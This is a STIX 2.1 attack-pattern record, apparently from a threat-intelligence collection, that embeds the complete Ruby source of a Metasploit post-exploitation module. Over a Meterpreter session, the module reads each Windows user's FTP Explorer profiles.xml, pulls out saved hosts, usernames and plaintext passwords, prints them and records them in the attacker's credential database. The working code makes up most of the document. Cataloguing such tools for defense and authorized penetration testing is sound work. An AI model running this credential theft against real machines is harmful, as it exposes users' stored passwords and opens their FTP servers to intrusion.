{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c302aba9-b9a3-471e-9ddf-f0c05f106288",
    "created": "2024-08-14T16:33:08.228834Z",
    "modified": "2024-08-14T16:33:08.228839Z",
    "name": "Windows Gather FTP Explorer (FTPX) Credential Extraction",
    "description": " This module finds saved login credentials for the FTP Explorer (FTPx) FTP client for Windows.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/ftpx.rb",
            "external_id": "ftpx.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rexml/document'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::UserProfiles\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather FTP Explorer (FTPX) Credential Extraction',\n        'Description' => %q{\n          This module finds saved login credentials for the FTP Explorer (FTPx)\n          FTP client for Windows.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'bcoles' ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_channel_eof\n              core_channel_open\n              core_channel_read\n              core_channel_write\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def run\n    grab_user_profiles.each do |user|\n      next if user['AppData'].nil?\n\n      xml = get_xml(user['AppData'] + '\\\\FTP Explorer\\\\profiles.xml')\n      unless xml.nil?\n        parse_xml(xml)\n      end\n    end\n  end\n\n  def get_xml(path)\n    connections = client.fs.file.new(path, 'r')\n\n    condata = ''\n    condata << connections.read until connections.eof\n    return condata\n  rescue Rex::Post::Meterpreter::RequestError => e\n    print_error \"Error when reading #{path} (#{e.message})\"\n    return nil\n  end\n\n  # Extracts the saved connection data from the XML.\n  # Reports the credentials back to the database.\n  def parse_xml(data)\n    mxml = REXML::Document.new(data).root\n    mxml.elements.to_a('//FTPx10//Profiles//').each.each do |node|\n      next if node.elements['Host'].nil?\n      next if node.elements['Login'].nil?\n      next if node.elements['Password'].nil?\n\n      host = node.elements['Host'].text\n      port = node.elements['Port'].text\n      user = node.elements['Login'].text\n      pass = node.elements['Password'].text\n\n      # skip blank passwords\n      next if !pass || pass.empty?\n\n      # show results to the user\n      print_good(\"#{session.sock.peerhost}:#{port} (#{host}) - '#{user}:#{pass}'\")\n\n      # save results to the db\n      service_data = {\n        address: Rex::Socket.getaddress(host),\n        port: port,\n        protocol: 'tcp',\n        service_name: 'ftp',\n        workspace_id: myworkspace_id\n      }\n\n      credential_data = {\n        origin_type: :session,\n        session_id: session_db_id,\n        post_reference_name: refname,\n        username: user,\n        private_data: pass,\n        private_type: :password\n      }\n\n      credential_core = create_credential(credential_data.merge(service_data))\n\n      login_data = {\n        core: credential_core,\n        access_level: 'User',\n        status: Metasploit::Model::Login::Status::UNTRIED\n      }\n\n      create_credential_login(login_data.merge(service_data))\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}